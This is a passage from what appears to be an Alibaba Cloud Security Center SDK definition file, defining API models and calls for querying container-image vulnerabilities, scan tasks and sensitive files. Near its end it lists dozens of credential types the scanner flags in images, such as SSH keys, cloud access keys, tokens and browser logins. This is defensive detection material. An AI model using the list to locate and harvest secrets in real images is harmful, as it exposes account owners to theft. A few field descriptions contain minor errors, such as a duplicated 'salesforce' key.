*   **sca**: image application vulnerability', example='cve'),
  uuids?: string(name='Uuids', description='The UUID of the asset. Separate multiple UUIDs with commas (,).', example='uuid-13134124****'),
}

model DescribeImageGroupedVulListResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='2'),
  groupedVulItems?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2017:3075-Important: wget security update'),
      asapCount?: int32(name='AsapCount', description='The number of vulnerabilities that have the high priority.', example='26'),
      canFix?: string(name='CanFix', description='Indicates whether the vulnerability can be fixed in the Security Center console. Valid values:

*   **yes**
*   **no**', example='yes'),
      gmtLast?: long(name='GmtLast', description='The timestamp when the first scan was performed. Unit: milliseconds.', example='1611201274000'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='1611201274000'),
      laterCount?: int32(name='LaterCount', description='The number of vulnerabilities that have the medium priority.', example='26'),
      name?: string(name='Name', description='The name of the vulnerability.', example='debian:9:CVE-2019-3858'),
      nntfCount?: int32(name='NntfCount', description='The number of vulnerabilities that have the low priority.', example='29'),
      status?: int32(name='Status', description='The status of the vulnerability. Valid values:

*   **0**: unhandled
*   **1**: handled
*   **2**: verifying
*   **3**: added to the whitelist', example='0'),
      tags?: string(name='Tags', description='The tag of the vulnerability. Valid values:

*   Restart required
*   Remote exploitation
*   Exploit exists
*   Exploitable
*   Privilege escalation
*   Code execution', example='EXP exists'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: image system vulnerability
*   **sca**: image application vulnerability', example='cve'),
    }
  ](name='GroupedVulItems', description='An array that consists of the image vulnerabilities.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5E244439-UJND-8BF7-26F36E21B9AA'),
  totalCount?: int32(name='TotalCount', description='The total number of image system vulnerabilities.', example='21'),
}

model DescribeImageGroupedVulListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageGroupedVulListResponseBody(name='body'),
}

/**
 * @summary Queries image vulnerabilities.
 *
 * @param request DescribeImageGroupedVulListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageGroupedVulListResponse
 */
async function describeImageGroupedVulListWithOptions(request: DescribeImageGroupedVulListRequest, runtime: Util.RuntimeOptions): DescribeImageGroupedVulListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.cveId)) {
    query['CveId'] = request.cveId;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.imageLayer)) {
    query['ImageLayer'] = request.imageLayer;
  }
  if (!Util.isUnset(request.imageTag)) {
    query['ImageTag'] = request.imageTag;
  }
  if (!Util.isUnset(request.isLatest)) {
    query['IsLatest'] = request.isLatest;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.patchId)) {
    query['PatchId'] = request.patchId;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.repoRegionId)) {
    query['RepoRegionId'] = request.repoRegionId;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageGroupedVulList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries image vulnerabilities.
 *
 * @param request DescribeImageGroupedVulListRequest
 * @return DescribeImageGroupedVulListResponse
 */
async function describeImageGroupedVulList(request: DescribeImageGroupedVulListRequest): DescribeImageGroupedVulListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageGroupedVulListWithOptions(request, runtime);
}

model DescribeImageInfoListRequest {
  uuids?: string(name='Uuids', description='The UUID of the server. Separate multiple UUIDs with commas (,).

> You can call the [DescribeCloudCenterInstances](https://help.aliyun.com/document_detail/141932.html) operation to query the UUIDs of servers.

This parameter is required.', example='391abd09184cbd3743d7f5ec125d****,
e6aeb2a5b6004479398b0bcd1160****'),
}

model DescribeImageInfoListResponseBody = {
  imageInfos?: [ 
    {
      alarmCount?: int32(name='AlarmCount', description='The number of alerts that are generated on the current pod, application, namespace, or cluster.', example='10'),
      alarmStatus?: string(name='AlarmStatus', description='Indicates whether alerts are generated on the asset. Valid values:

*   **YES**
*   **NO**', example='YES'),
      digest?: string(name='Digest', description='The digest value of the image.', example='a3521b04dfdd1361a24be6263f2983cf12ba910989f4d9f7324da7e1e89f****'),
      endpoints?: string(name='Endpoints', description='The endpoint of Container Registry.', example='cn-hangzhou-x7'),
      imageCreate?: long(name='ImageCreate', description='The time when the image was created.', example='1636962328000'),
      imageId?: string(name='ImageId', description='The ID of the image.', example='bb0175afea16138815a8900adeeb0315d88a83a2376eeffa14db1d693a15****'),
      imageSize?: long(name='ImageSize', description='The size of the image.', example='157408623'),
      imageUpdate?: long(name='ImageUpdate', description='The time when the image was updated.', example='1636974116000'),
      instanceId?: string(name='InstanceId', description='The ID of the image instance.', example='i-wz95abw6pa7y79ve****'),
      regionId?: string(name='RegionId', description='The region ID of the image instance.', example='cn-hangzhou'),
      registryType?: string(name='RegistryType', description='The type of the registration.', example='harbor'),
      repoId?: string(name='RepoId', description='The ID of the image repository.', example='crr-5qk9v2rdt0s****'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='opa-test'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2'),
      repoType?: string(name='RepoType', description='The type of the image repository. Valid values:

*   `PUBLIC`
*   `PRIVATE`', example='PUBLIC'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether the image is at risk. Valid values:

*   **YES**
*   **NO**', example='YES'),
      status?: string(name='Status', description='The status of the image.', example='NORMAL'),
      tag?: string(name='Tag', description='The tag that is added to the image.', example='v1'),
      tagImmutable?: int32(name='TagImmutable', description='The tag immutability.', example='0'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='ff9ca084-7faa-4ab2-8728-69024755****'),
      vulCount?: int32(name='VulCount', description='The total number of vulnerabilities in your assets.', example='1'),
      vulStatus?: string(name='VulStatus', description='Indicates whether vulnerabilities are detected on the asset. Valid values:

*   **YES**
*   **NO**', example='YES'),
    }
  ](name='ImageInfos', description='An array that consists of the information about images.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BC3B0DAE-CC0E-59E9-9383-6F060F22****'),
}

model DescribeImageInfoListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageInfoListResponseBody(name='body'),
}

/**
 * @summary Queries images.
 *
 * @param request DescribeImageInfoListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageInfoListResponse
 */
async function describeImageInfoListWithOptions(request: DescribeImageInfoListRequest, runtime: Util.RuntimeOptions): DescribeImageInfoListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageInfoList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries images.
 *
 * @param request DescribeImageInfoListRequest
 * @return DescribeImageInfoListResponse
 */
async function describeImageInfoList(request: DescribeImageInfoListRequest): DescribeImageInfoListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageInfoListWithOptions(request, runtime);
}

model DescribeImageInstancesRequest {
  criteria?: string(name='Criteria', description='The search condition that is used to filter the server. The value of this parameter is in the JSON format and contains the following fields:

*   **name**: the search condition

*   **name**: the value of the search condition

*   **logicalExp**: the logical relation for multiple search conditions Valid values:

    *   **OR**: The search conditions use a logical **OR**.
    *   **AND**: The search conditions use a logical **AND**.

> You can call the [DescribeImageCriteria](https://help.aliyun.com/document_detail/471822.html) operation to query the supported search conditions.', example='[{"name":"instanceId","value":"390100182","logicalExp":"AND"}]'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1'),
  logicalExp?: string(name='LogicalExp', description='The logical relationship that you want to use to evaluate multiple search conditions. Valid values:

*   **OR**: The search conditions are evaluated by using a logical **OR**.
*   **AND**: The search conditions are evaluated by using a logical **AND**.', example='OR'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> : We recommend that you do not leave this parameter empty.', example='20'),
  scanned?: boolean(name='Scanned', description='Specifies whether the image is scanned. Valid values:

*   **true**
*   **false**', example='true'),
}

model DescribeImageInstancesResponseBody = {
  imageInstanceList?: [ 
    {
      alarmCount?: int32(name='AlarmCount', description='The number of alerts that are generated for the image.', example='0'),
      alarmStatus?: string(name='AlarmStatus', description='Indicates whether alerts are generated for the image. Valid values:

*   **YES**
*   **NO**', example='NO'),
      deployed?: int32(name='Deployed', description='Indicates whether the image was deployed. Valid values:

*   **0**: The image was not deployed.
*   **1**: The image was deployed.', example='1'),
      digest?: string(name='Digest', description='The digest value of the image.', example='a5ccdd9b166b67e02954aa9b618fe19b7968bd56a15463d2ad7f2643ba5b****'),
      endpoints?: string(name='Endpoints', description='The address of the image.', example='[]'),
      hcCount?: int32(name='HcCount', description='The number of baseline risks.', example='0'),
      hcStatus?: string(name='HcStatus', description='Indicates whether baseline risks exist. Valid values:

*   **NO**
*   **YES**', example='NO'),
      imageCreate?: string(name='ImageCreate', description='The timestamp generated when the image was created. Unit: milliseconds.', example='1600069948849'),
      imageId?: string(name='ImageId', description='The ID of the image.', example='c20987f18b130f9d144c9828df630417e2a9523148930dc3963e9d0dab30****'),
      imageSize?: string(name='ImageSize', description='The size of the image. Unit: MB.', example='1604487690'),
      imageUpdate?: string(name='ImageUpdate', description='The timestamp generated when the image was updated. Unit: milliseconds.', example='1600069948849'),
      instanceId?: string(name='InstanceId', description='The instance ID of the image.', example='39010****'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='1721363159000'),
      regionId?: string(name='RegionId', description='The region ID of the image.', example='cn-hangzhou'),
      registryType?: string(name='RegistryType', description='The type of the image. Valid values:

*   **acr**
*   **harbor**
*   **quay**
*   **CI/CD**', example='acr'),
      repoId?: string(name='RepoId', description='The ID of the image repository.', example='f2b86d20bf0855af6aa268ce90fd****'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='sas-script-test'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='N/A'),
      repoType?: string(name='RepoType', description='The type of the repository. Valid values:

*   **private**
*   **public**', example='private'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether risks exist. Valid values:

*   **NO**
*   **YES**', example='NO'),
      scaProgress?: int32(name='ScaProgress', description='The scan progress of the image. Valid values: 0 to 100.', example='100'),
      scaResult?: string(name='ScaResult', description='The error code of the image scan result. Valid values:

*   **TASK_NOT_EXISTS**: The image scan task does not exist.
*   **TASK_NOT_SUPPORT_REGION**: The image scan task cannot be performed in the current region.
*   **forbid_create_repeat_task**: The image scan task already exists.', example='TASK_NOT_SUPPORT_REGION'),
      scaStatus?: string(name='ScaStatus', description='The scan status of the image. Valid values:

*   **INIT**: The image scan task is pending startup.
*   **START**: The image scan task is started.
*   **MESSAGE_SEND**: The message about the image scan task is sent.
*   **START_RUN**: The image analysis task is started.
*   **DOWNLOAD**: The image scan result is downloaded.
*   **PRE_ANALYZER**: The image pre-analysis is started.
*   **WEB_SHELL_ANALYZER**: The WebShell analysis of the image is complete.
*   **CVE_ANALYZER**: The Common Vulnerabilities and Exposures (CVE) analysis of the image is complete.
*   **BIN_ANALYZER**: The binary analysis of the image is complete.
*   **OTHER_ANALYZER**: The extended analysis of the image is complete.
*   **SUCCESS**: The image scan task is complete.
*   **PRE_ANALYZER_SUCCESS**: The image pre-analysis is complete.
*   **FAIL**: The image scan task failed.
*   **TIMEOUT**: The image scan task timed out.', example='SUCCESS'),
      status?: string(name='Status', description='The status of the image. Valid values:

*   **NORMAL**', example='NORMAL'),
      tag?: string(name='Tag', description='The tag of the image.', example='mysql_5.7'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='12f80307-60aa-4efa-863a-56d72fb****'),
      vulCount?: int32(name='VulCount', description='The number of vulnerabilities in the image.', example='0'),
      vulStatus?: string(name='VulStatus', description='Indicates whether vulnerabilities exist in the image. Valid values:

*   **YES**
*   **NO**', example='NO'),
    }
  ](name='ImageInstanceList', description='The information about the images.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of images returned on the current page.', example='4'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of returned entries.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model DescribeImageInstancesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageInstancesResponseBody(name='body'),
}

/**
 * @summary Queries information about images.
 *
 * @param request DescribeImageInstancesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageInstancesResponse
 */
async function describeImageInstancesWithOptions(request: DescribeImageInstancesRequest, runtime: Util.RuntimeOptions): DescribeImageInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.scanned)) {
    query['Scanned'] = request.scanned;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries information about images.
 *
 * @param request DescribeImageInstancesRequest
 * @return DescribeImageInstancesResponse
 */
async function describeImageInstances(request: DescribeImageInstancesRequest): DescribeImageInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageInstancesWithOptions(request, runtime);
}

model DescribeImageLatestScanTaskRequest {
  digest?: string(name='Digest', description='The digest value of the image.

This parameter is required.', example='8f0fbdb41d3d1ade4ffdf21558443f4c03342010563bb8c43ccc09594d50****'),
}

model DescribeImageLatestScanTaskResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
  task?: [ 
    {
      create?: string(name='Create', description='The time when the task was created. The time is in the yyyy-MM-dd HH:mm:ss format.', example='2022-12-20 11:59:05'),
      finish?: int32(name='Finish', description='The number of images that are scanned.', example='100'),
      finishTime?: long(name='FinishTime', description='The end time of the task. A value is returned only when the task is in the Finished state. Otherwise, the returned value is empty.', example='1669693430977'),
      id?: long(name='Id', description='The task ID.', example='9755662'),
      modified?: string(name='Modified', description='The time when the task was last modified. The time is in the yyyy-MM-dd HH:mm:ss format.', example='2022-12-20 12:00:05'),
      name?: string(name='Name', description='The name of the task.', example='IMAGE_SCAN'),
      source?: string(name='Source', description='The method in which the task was created. A task can be created in the Security Center console or by calling an API operation. Valid values:

*   **console_batch**: The task was created in the Security Center console.
*   **openapi**: The task was created by calling an API operation.', example='console_batch'),
      startTime?: long(name='StartTime', description='The start time of the task.', example='1668614400000'),
      status?: string(name='Status', description='The status of the task. Valid value:

*   **PROCESSING**: The task is running.
*   **START**: The task is being started.
*   **MESSAGE_SEND**: The scan task is sent.
*   **PRE_ANALYZER**: The image is in precheck.
*   **SUCCESS**: The task was successful.
*   **FAIL**: The task failed.
*   **TIMOUT**: The task timed out.', example='SUCCESS'),
      target?: string(name='Target', description='The digest value of the image.', example='8f0fbdb41d3d1ade4ffdf21558443f4c03342010563bb8c43ccc09594d50****'),
      targetType?: string(name='TargetType', description='The type of the scanned asset. Valid value:

*   **IMAGE**', example='IMAGE'),
      taskId?: string(name='TaskId', description='The ID of the scan task.', example='0a960b9a48b788a8689154b032bf****'),
      taskType?: string(name='TaskType', description='The type of the task. Valid value:

*   **IMAGE_SCAN**', example='IMAGE_SCAN'),
    }
  ](name='Task', description='An array that consists of the information about the task.'),
}

model DescribeImageLatestScanTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageLatestScanTaskResponseBody(name='body'),
}

/**
 * @summary Queries the most recent scan task that is created for an image.
 *
 * @param request DescribeImageLatestScanTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageLatestScanTaskResponse
 */
async function describeImageLatestScanTaskWithOptions(request: DescribeImageLatestScanTaskRequest, runtime: Util.RuntimeOptions): DescribeImageLatestScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.digest)) {
    query['Digest'] = request.digest;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageLatestScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the most recent scan task that is created for an image.
 *
 * @param request DescribeImageLatestScanTaskRequest
 * @return DescribeImageLatestScanTaskResponse
 */
async function describeImageLatestScanTask(request: DescribeImageLatestScanTaskRequest): DescribeImageLatestScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageLatestScanTaskWithOptions(request, runtime);
}

model DescribeImageListByBuildRiskRequest {
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  riskKey?: string(name='RiskKey', description='The key of the risk. You can call the [DescribeImageBuildRiskList](~~~~) operation to obtain the value of RiskKey.', example='no_user'),
  riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='medium'),
  status?: int32(name='Status', description='The status of the alert event. Valid values:

*   **0**: unhandled.
*   **1**: ignored.
*   **2**: false positive.', example='1'),
}

model DescribeImageListByBuildRiskResponseBody = {
  code?: string(name='Code', description='The response code.', example='200'),
  data?: {
    list?: [ 
      {
        digest?: string(name='Digest', description='The digest value of the image.', example='a5ccdd9b166b67e02954aa9b618fe19b7968bd56a15463d2ad7f2643ba5b****'),
        firstScanTime?: long(name='FirstScanTime', description='The timestamp generated when the first scan was performed. Unit: milliseconds.', example='1723710827000'),
        instanceId?: string(name='InstanceId', description='The instance ID of the image repository.', example='39010****'),
        lastScanTime?: long(name='LastScanTime', description='The timestamp generated when the last scan was performed. Unit: milliseconds.', example='1723710827999'),
        regionId?: string(name='RegionId', description='The ID of the region.', example='cn-hangzhou'),
        repoName?: string(name='RepoName', description='The name of the image repository.', example='test-tepo'),
        repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='namespace'),
        riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='medium'),
        status?: int32(name='Status', description='The status of the alert event. Valid values:

*   **0**: unhandled.
*   **1**: ignored.
*   **2**: false positive.', example='1'),
        tag?: string(name='Tag', description='The tag of the image.', example='v1'),
        uuid?: string(name='Uuid', description='The UUID of the image.', example='6ec898e6274f942e0e4a053eff1c****'),
      }
    ](name='List', description='The images.'),
    pageInfo?: {
      currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**.', example='1'),
      pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
      totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='109'),
    }(name='PageInfo', description='The pagination information.'),
  }(name='Data', description='The returned data.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='52870893-48A7-5A9E-9E05-6253E5B6****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model DescribeImageListByBuildRiskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageListByBuildRiskResponseBody(name='body'),
}

/**
 * @summary Queries a list of images that are affected by image build command risks by page.
 *
 * @param request DescribeImageListByBuildRiskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageListByBuildRiskResponse
 */
async function describeImageListByBuildRiskWithOptions(request: DescribeImageListByBuildRiskRequest, runtime: Util.RuntimeOptions): DescribeImageListByBuildRiskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskKey)) {
    query['RiskKey'] = request.riskKey;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageListByBuildRisk',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries a list of images that are affected by image build command risks by page.
 *
 * @param request DescribeImageListByBuildRiskRequest
 * @return DescribeImageListByBuildRiskResponse
 */
async function describeImageListByBuildRisk(request: DescribeImageListByBuildRiskRequest): DescribeImageListByBuildRiskResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageListByBuildRiskWithOptions(request, runtime);
}

model DescribeImageListBySensitiveFileRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page 1. Default value: 1.', example='1'),
  imageDigest?: string(name='ImageDigest', description='The image digest.
> Fuzzy match is supported.', example='v005'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20'),
  repoInstanceId?: string(name='RepoInstanceId', description='The ID of the specified container image.

> You can call the [ListRepository](https://help.aliyun.com/document_detail/451339.html) operation to obtain the IDs of container images from the value of the **InstanceId** response parameter.', example='i-qewqrqcsadf****'),
  repoName?: string(name='RepoName', description='The name of the image repository.

> Fuzzy match is supported.', example='harbor-image-v001'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.
> Fuzzy match is supported.', example='libssh2'),
  riskLevel?: string(name='RiskLevel', description='The risk level of the file. Separate multiple levels with commas (,). Valid values:

- **high**
- **medium**
- **low**', example='high'),
  scanRange?: [ string ](name='ScanRange', description='An array consisting of the types of the assets that you want to scan. Valid values:
- **image**
- **container**'),
  sensitiveFileKey?: string(name='SensitiveFileKey', description='The type of the alert for the sensitive file. Valid values:

*   **npm_token**: npm access token.
*   **ftp_cfg**: FTP configuration.
*   **google_oauth_key**: Google OAuth key.
*   **planetscale_passwd**: PlanetScale password.
*   **github_ssh_key**: Github SSH key.
*   **msbuild_publish_profile**: MSBuild publish profile.
*   **fastly_cdn_token**: Fastly CDN token.
*   **ssh_private_key**: SSH private key.
*   **aws_cli**: Amazon Web Services (AWS) CLI credential.
*   **cpanel_proftpd**: cPanel ProFTPD credential.
*   **postgresql_passwd**: PostgreSQL password file.
*   **discord_client_cred**: Discord client credential.
*   **rails_database**: Rails database configuration.
*   **aws_access_key**: AWS access key.
*   **esmtp_cfg**: configuration of mail server over Extended Simple Mail Transfer Protocol (ESMTP).
*   **docker_registry_cfg**: configuration of a Docker image repository.
*   **pem**: Privacy-Enhanced Mail (PEM).
*   **common_cred**: common credential.
*   **sftp_cfg**: configuration of connection over Secure File Transfer Protocol (SFTP).
*   **grafana_token**: Grafana token.
*   **slack_token**: Slack token.
*   **ec_private_key**: Elliptic Curve (EC) private key.
*   **pypi_token**: Python Package Index (PyPI) token.
*   **finicity_token**: Finicity token.
*   **k8s_client_key**: private key for the Kubernetes client.
*   **git_cfg**: Git configuration.
*   **django_key**: Django key.
*   **jenkins_ssh**: SSH configuration file for Jenkins.
*   **openssh_private_key**: OpenSSH private key.
*   **square_oauth**: Square OAuth credential.
*   **typeform_token**: Typeform token.
*   **common_database_cfg**: configuration of general database connection.
*   **wordpress_database_cfg**: WordPress database configuration.
*   **googlecloud_api_key**: API key for Google Cloud.
*   **vscode_sftp**: VSCode SFTP configuration.
*   **apache_htpasswd**: Apache htpasswd.
*   **planetscale_token**: PlanetScale token.
*   **contentful_preview_token**: preview token for Contentful.
*   **php_database_cfg**: database password for a PHP application.
*   **atom_remote_sync**: Atom remote synchronization configuration.
*   **aws_session_token**: AWS session token.
*   **atom_sftp_cfg**: Atom SFTP configuration.
*   **asana_client_private_key**: private key for the Asana client.
*   **tencentcloud_ak**: secret ID of a third-party cloud.
*   **rsa_private_key**: Rivest-Shamir-Adleman (RSA) private key.
*   **github_personal_token**: personal access token for GitHub.
*   **pgp**: Pretty Good Privacy (PGP) encrypted file.
*   **stripe_skpk**: Stripe secret key.
*   **square_token**: Square access token.
*   **rails_carrierwave**: Rails Carrierwave credential.
*   **dbeaver_database_cfg**: DBeaver database configuration.
*   **robomongo_cred**: RoboMongo credential.
*   **github_oauth_token**: OAuth access token for GitHub.
*   **pulumi_token**: Pulumi token.
*   **ventrilo_voip**: configuration of a Ventrilo VoIP server.
*   **macos_keychain**: macOS keychain.
*   **amazon_mws_token**: Amazon MWS token.
*   **dynatrace_token**: Dynatrace token.
*   **java_keystore**: Java KeyStore (JKS).
*   **microsoft_sdf**: Microsoft SQL Server Compact Edition (CE) database.
*   **kubernetes_dashboard_cred**: user credential for Kubernetes Dashboard.
*   **atlassian_token**: Atlassian token.
*   **rdp**: remote desktop protocol (RDP).
*   **mailgun_key**: Mailgun webhook signing key.
*   **mailchimp_api_key**: API key for Mailchimp.
*   **netrc_cfg**: .netrc configuration file.
*   **openvpn_cfg**: configuration of the OpenVPN client.
*   **github_refresh_token**: GitHub refresh token.
*   **salesforce**: Salesforce credential.
*   **salesforce**: Sendinblue token.
*   **pkcs_private_key**: PKCS#12 private key.
*   **rubyonrails_passwd**: Ruby on Rails password file.
*   **filezilla_ftp**: FileZilla FTP configuration.
*   **databricks_token**: Databricks token.
*   **gitLab_personal_toke**: personal access token for GitLab.
*   **rails_master_key**: Rails master key.
*   **sqlite**: SQLite3 or SQLite database.
*   **firefox_logins**: Firefox logon configuration.
*   **mailgun_private_token**: Mailgun private token.
